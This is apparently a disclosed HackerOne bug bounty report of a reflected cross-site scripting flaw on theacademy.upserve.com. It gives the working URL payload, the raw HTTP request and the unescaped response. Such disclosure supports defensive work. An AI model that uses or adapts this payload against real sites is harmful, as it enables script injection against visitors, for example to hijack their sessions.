@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/389592
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Upserve (upserve)
+BountyAmount:250.0
+Severity:low
+State:Closed
+DateOfDisclosure:19.10.2018 13:24:44
+
+Summary:
+The reporter discovered an unauthenticated reflected cross-site scripting vulnerability in theacademy.upserve.com by setting the XSS payload as a GET parameter.
+**Steps To Reproduce:**
+Open URL in FireFox:
+```
+https://theacademy.upserve.com/roles/?%22%3E%3Cscript//src=data&colon;,alert(location)//
+```
+
+**HTTP Request**
+```http
+GET /roles/?%22%3E%3Cscript//src=data&colon;,alert(location)// HTTP/1.1
+Host: theacademy.upserve.com
+```
+
+**HTTP Response**
+```html
+<a class="category dropdown-item name-sort sorting-desc" href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=name&order=DESC">Name</a>
+<a class="category dropdown-item views-sort " href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=views&order=DESC" >Views</a>
+<a class="category dropdown-item duration-sort " href="/roles/?"><script//src=data&colon;,alert(location)//&orderby=duration&order=DESC">Duration</a>
+```
+
+## Impact
+
+Reflected XSS
